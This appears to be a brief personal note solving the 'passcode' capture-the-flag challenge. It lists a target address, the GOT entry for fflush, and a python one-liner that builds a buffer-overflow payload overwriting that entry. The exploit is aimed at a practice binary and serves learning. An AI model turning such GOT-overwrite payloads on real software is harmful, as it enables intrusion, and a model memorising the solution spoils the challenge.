# passcode

#what to write>>: 0x080485e3: 134514147

# where to write >> 0804a004  00000207 R_386_JUMP_SLOT   00000000   
fflush@GLIBC_2.0

python -c "print 'a'*96 + '\x04\xa0\x04\x08\n134514147\n10\n'" > tmp/test
